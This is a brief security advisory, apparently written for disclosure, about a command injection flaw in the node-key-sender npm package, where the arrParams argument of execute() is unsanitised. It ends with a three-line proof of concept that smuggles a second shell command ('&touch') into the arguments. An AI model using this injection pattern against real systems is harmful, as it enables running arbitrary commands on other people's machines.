# Overview

`node-key-sender` is a module that send keyboard events to the operational system, this package are vulnerable to Command Injection.

The argument `arrParams` in function `execute()` can be controlled by users without any sanitization.

# Proof of Concept

```
var root = require("node-key-sender");
var attack_code = ["&touch", "Song"];
root.execute(attack_code);
```
